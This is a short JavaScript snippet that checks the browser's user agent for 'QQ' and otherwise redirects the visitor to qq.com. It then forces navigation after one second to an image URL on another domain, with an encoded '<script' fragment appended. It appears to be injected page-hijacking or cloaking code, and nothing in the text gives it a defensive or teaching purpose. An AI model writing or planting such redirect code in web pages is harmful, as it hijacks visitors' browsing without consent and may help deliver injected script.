function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://img.zhisheji.com/uploads/0104/17043568190004c0e.png' + '#' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
